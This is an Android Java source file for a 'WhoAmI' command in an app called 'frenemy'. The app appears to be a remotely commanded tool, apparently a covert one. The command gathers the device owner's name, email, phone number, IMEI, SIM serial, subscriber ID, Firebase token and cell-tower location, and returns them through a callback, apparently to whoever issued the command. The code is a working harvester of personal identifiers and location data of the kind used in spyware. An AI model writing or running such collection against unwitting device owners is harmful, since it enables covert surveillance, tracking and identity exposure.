package com.theah64.frenemy.android.commandcenter.commands;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.NeighboringCellInfo;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;

import com.google.firebase.iid.FirebaseInstanceId;
import com.theah64.frenemy.android.models.Frenemy;
import com.theah64.frenemy.android.utils.CommonUtils;
import com.theah64.frenemy.android.utils.DarKnight;
import com.theah64.frenemy.android.utils.PrefUtils;
import com.theah64.frenemy.android.utils.ProfileUtils;

import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

/**
 * Created by theapache64 on 10/6/17.
 */

public class WhoAmI extends BaseCommand {

    private static final String FLAG_ALL = "a";
    private static final Options options = new Options()
            .addOption(FLAG_ALL, false, "Keyword");
    private TelephonyManager tm;

    public WhoAmI(String command) throws CommandException, ParseException {
        super(command);
    }

    private static String getPhoneType(int phoneType) {
        switch (phoneType) {
            case TelephonyManager.PHONE_TYPE_NONE:
                return "TYPE_NONE";
            case TelephonyManager.PHONE_TYPE_GSM:
                return "TYPE_GSM";
            case TelephonyManager.PHONE_TYPE_CDMA:
                return "TYPE_CDMA";
            case TelephonyManager.PHONE_TYPE_SIP:
                return "TYPE_SIP";
            default:
                return "TYPE_VERY_NONE";
        }
    }

    private static String getNetworkType(int dataNetworkType) {
        switch (dataNetworkType) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return "TYPE_GPRS";
            case TelephonyManager.NETWORK_TYPE_EDGE:
                return "TYPE_EDGE";
            case TelephonyManager.NETWORK_TYPE_UMTS:
                return "TYPE_UMTS";
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                return "TYPE_HSDPA";
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                return "TYPE_HSUPA";
            case TelephonyManager.NETWORK_TYPE_HSPA:
                return "HSPA";
            case TelephonyManager.NETWORK_TYPE_CDMA:
                return "TYPE_CDMA";
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                return "TYPE_EVDO_0";
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                return "TYPE_EVDO_A";
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
                return "TYPE_EVDO_B";
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                return "TYPE_1xRTT";
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return "TYPE_IDEN";
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "TYPE_LTE";
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                return "TYPE_EHRPD";
            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
                return "TYPE_UNKNOWN";
            default:
                return "TYPE_VERY_UNKNOWN";
        }
    }

    private static String getDeviceName() {
        final String manufacturer = Build.MANUFACTURER;
        final String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model.toUpperCase();
        } else {
            return manufacturer.toUpperCase() + " " + model;
        }
    }

    @Override
    public void handle(Context context, Callback callback) {

        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();

        final String imei = tm.getDeviceId();
        final String deviceName = getDeviceName();
        final String deviceHash = DarKnight.getEncrypted(deviceName + imei);

        final String email = profileUtils.getPrimaryEmail();
        final String phone = profileUtils.getPhone();
        final PrefUtils prefUtils = PrefUtils.getInstance(context);

        String fcmId = FirebaseInstanceId.getInstance().getToken();

        if (fcmId == null) {
            fcmId = prefUtils.getString(Frenemy.KEY_FCM_ID);
        }

        //Attaching them with the request
        final StringBuilder whoami = new StringBuilder();
        whoami
                .append("name : ").append(name).append("</br>")
                .append("imei : ").append(imei).append("</br>")
                .append("device_name : ").append(deviceName).append("</br>")
                .append("device_hash : ").append(deviceHash).append("</br>")
                .append("device_info_static : ").append(getDeviceInfoStatic()).append("</br>")
                .append("device_info_dynamic : ").append(getDeviceInfoDynamic()).append("</br>")
                .append("fcm_id : ").append(fcmId).append("</br>")
                .append("email : ").append(email).append("</br>")
                .append("phone : ").append(phone).append("</br>");

        callback.onFinish(whoami.toString());
    }


    private String getDeviceInfoStatic() {

        final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();

        //Collecting device details
        deviceInfoBuilder
                .put("Build.BOARD", Build.BOARD)
                .put("Build.BOOTLOADER", Build.BOOTLOADER)
                .put("Build.BRAND", Build.BRAND)
                .put("Build.DEVICE", Build.DEVICE)
                .put("Build.FINGERPRINT", Build.FINGERPRINT)
                .put("Build.DISPLAY", Build.DISPLAY)
                .put("Build.HARDWARE", Build.HARDWARE)
                .put("Build.HOST", Build.HOST)
                .put("Build.ID", Build.ID)
                .put("Build.PRODUCT", Build.PRODUCT)
                .put("Build.SERIAL", Build.SERIAL);


        if (CommonUtils.isSupport(14)) {
            deviceInfoBuilder.putLastInfo("Build.getRadioVersion()", Build.getRadioVersion());
        } else {
            //noinspection deprecation
            deviceInfoBuilder.putLastInfo("Build.RADIO", Build.RADIO);
        }

        return deviceInfoBuilder.toString();
    }

    @SuppressLint("NewApi")
    private String getDeviceInfoDynamic() {

        final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();
        //NOT NEEDED FOR NOW.

        if (getCmd().hasOption(FLAG_ALL)) {

            int i = 0;
            if (CommonUtils.isSupport(17)) {
                for (final CellInfo cellInfo : tm.getAllCellInfo()) {
                    i++;

                    deviceInfoBuilder.put(i + " CellInfo timeStamp", cellInfo.getTimeStamp());
                    deviceInfoBuilder.put(i + " CellInfo isRegistered", cellInfo.isRegistered());

                    if (cellInfo instanceof CellInfoCdma) {
                        deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoCdma) cellInfo).getCellSignalStrength().toString());
                        deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoCdma) cellInfo).getCellIdentity().toString());
                    } else if (cellInfo instanceof CellInfoGsm) {
                        deviceInfoBuilder.put(i + " CellInfoGsm Signal strength", ((CellInfoGsm) cellInfo).getCellSignalStrength().toString());
                        deviceInfoBuilder.put(i + " CellInfoGsm CellIdentity", ((CellInfoGsm) cellInfo).getCellIdentity().toString());
                    } else if (cellInfo instanceof CellInfoWcdma) {
                        deviceInfoBuilder.put(i + " CellInfoWcdma Signal strength", ((CellInfoWcdma) cellInfo).getCellSignalStrength().toString());
                        deviceInfoBuilder.put(i + " CellInfoWcdma CellIdentity", ((CellInfoWcdma) cellInfo).getCellIdentity().toString());
                    } else if (cellInfo instanceof CellInfoLte) {
                        deviceInfoBuilder.put(i + " CellInfoLte Signal strength", ((CellInfoLte) cellInfo).getCellSignalStrength().toString());
                        deviceInfoBuilder.put(i + " CellInfoLte CellIdentity", ((CellInfoLte) cellInfo).getCellIdentity().toString());
                    } else {
                        deviceInfoBuilder.put(i + "CellInfo class", cellInfo.getClass().getName());
                        deviceInfoBuilder.put(i + "CellInfo toString", cellInfo.toString());
                    }
                }
            } else {
                for (final NeighboringCellInfo cellInfo : tm.getNeighboringCellInfo()) {
                    i++;
                    deviceInfoBuilder.put(i + " celInfo", cellInfo.toString());
                }
            }
        }

        deviceInfoBuilder.put("NetworkCountryISO", tm.getNetworkCountryIso())
                .put("NetworkOperator", tm.getNetworkOperator())
                .put("NetworkOperatorName", tm.getNetworkOperatorName())
                .put("NetworkType", getNetworkType(tm.getNetworkType()));

        if (CommonUtils.isSupport(23)) {
            deviceInfoBuilder.put("PhoneCount", tm.getPhoneCount());
        }

        deviceInfoBuilder.put("PhoneType", getPhoneType(tm.getPhoneType()));
        deviceInfoBuilder.put("SIMCountryISO", tm.getSimCountryIso());
        deviceInfoBuilder.put("SIMOperator", tm.getSimOperator());
        deviceInfoBuilder.put("SIMOperatorName", tm.getSimOperatorName());
        deviceInfoBuilder.put("SIMSerialNumber", tm.getSimSerialNumber());

        //TODO: can be elaborate later.
        deviceInfoBuilder.put("SIM State", tm.getSimState());

        deviceInfoBuilder.put("SubscriberID", tm.getSubscriberId());
        deviceInfoBuilder.put("VoiceMailAlphaTag", tm.getVoiceMailAlphaTag());
        deviceInfoBuilder.put("VoiceMailNumber", tm.getVoiceMailNumber());

        //Collecting cell location
        final GsmCellLocation gcmCellLoc = (GsmCellLocation) tm.getCellLocation();
        if (gcmCellLoc != null) {
            deviceInfoBuilder.put("CID", gcmCellLoc.getCid())
                    .put("LAC", gcmCellLoc.getLac())
                    .put("PSC", gcmCellLoc.getPsc());
        }


        if (CommonUtils.isSupport(24)) {
            deviceInfoBuilder.put("DataNetworkType", getNetworkType(tm.getDataNetworkType()));
        }

        if (CommonUtils.isSupport(19)) {
            deviceInfoBuilder.put("MMSUAProfileUrl", tm.getMmsUAProfUrl());
            deviceInfoBuilder.put("MMSUserAgent", tm.getMmsUserAgent());
        }

        //Collecting sim card details
        deviceInfoBuilder.put("DeviceId", tm.getDeviceId())
                .put("Line1Number", tm.getLine1Number())
                .putLastInfo("SoftwareVersion", tm.getDeviceSoftwareVersion());

        if (tm.getCellLocation() != null) {
            deviceInfoBuilder.put("CellLocation", tm.getCellLocation().toString());
        }

        return deviceInfoBuilder.toString();
    }

    @Override
    public Options getOptions() {
        return options;
    }

    public static class DeviceInfoBuilder {

        private static final String HOT_REGEX = "[,=]";
        public StringBuilder stringBuilder = new StringBuilder();

        private static String getCooledValue(String value) {
            if (value == null || value.isEmpty()) {
                return "-";
            }
            return value.replaceAll(HOT_REGEX, "~");
        }

        public DeviceInfoBuilder put(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value)).append("</br>");
            return this;
        }

        public DeviceInfoBuilder put(final String key, final int value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final long value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final boolean value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder putLastInfo(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value));
            return this;
        }

        @Override
        public String toString() {
            return stringBuilder.toString();
        }
    }
}
